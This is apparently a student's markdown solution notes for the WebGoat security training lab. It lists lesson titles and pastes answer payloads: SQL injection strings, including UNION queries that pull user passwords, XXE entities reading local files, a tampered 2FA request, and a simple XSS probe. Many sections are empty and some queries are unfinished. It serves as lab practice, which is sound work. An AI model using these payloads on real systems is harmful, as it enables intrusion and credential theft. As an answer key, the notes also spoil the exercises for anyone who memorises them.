# WebGoat
## Francesco Mauri
---
## Introduction [x]
### WebGoat [x]
* Read
### WebWolf [x]
* Install Webwolf, send email, write code from mail.
* Reset password, go to Webwolf get code
## General [x]
### Http basics [x]
* write something
* intercept HTTP, get header and read the answer
### Http Proxies [x]
* Intercept package, modify it to suite the task, make sure to modify properly the POST
---
## Injection Flaws [ ]
### SQL Injeciton [x]
```SQL
smith' or '1' = '1
```
```SQL
1 or true
```
### SQL Injection advanced [ ]
```SQL
asd' or true; select * from user_system_data; --
```
```SQL
work in progress
```
### SQL Injeciton mitigation
```SQL
1' or true order by (case when (hostname = 'webgoat-prd') hostname else status;
```
* Solution: 192.168.4.0
### XXE
#### 3
```XML
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///" >]>
<comment>
  <text>aa&xxe;</text>
</comment>
```
#### 4
* Specify content type to be xml
```XML
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///" >]>
<comment>
  <text>aa&xxe;</text>
</comment>
```
#### 7
```XML
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:////home/USER/.webgoat/XXE/secret.txt" >]>
<comment>
  <text>a&xxe;</text>
</comment>
```
---
## Authentication Flaws
### Authentication Bypass
### JWT tokens (Under development)
## Coss-Site Scripting (XSS)
### Cross Site Scripting
## Access Control Flaws
### Insecure Direct Object References
### Missing Function Level Access Control
## Insecure Communication
### Insecure Login
## Request Forgeries
### Cross-Site Request Forgeries
## Vulnerable Components - A9
### Vulnerable Components
## Client side
### Client side filtering
### Bypass front-end restriction
### HTML tampering
## Challenges
### WebGoat Challenge
### Admin lost password
### Get it for free
### Photo comments
### Voting
### Without password
### Creating a new account
### Admin Password
### Without account
### Changing password
```sql
asd' or true union SELECT * FROM user_system_data;
asd' or true FULL OUTER JOIN user_system_data as usd ON USERID = usd.USERID;
```
---
asd' or true; select * from user_system_data; --
dave
---
user_system_data
SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'
SELECT TABLE_NAME FROM <DATABASE_NAME>.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'
SELECT TABLE_NAME FROM user_system_data.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'
Smith' or '1'=1 union select userid, password, password, password from user_system_data'
Smith' or '1'=1 union select userid, password, password, password from user_system_data --
select * from users order by (case when (true) then lastname else firstname)
---
# 2FA
(secQuestion0=aORtrue)&(secQuestion1=aORtrue)&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
---
#XSS
<script>alert('my javascript here')</script>
---
proxy
/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily HTTP/1.1
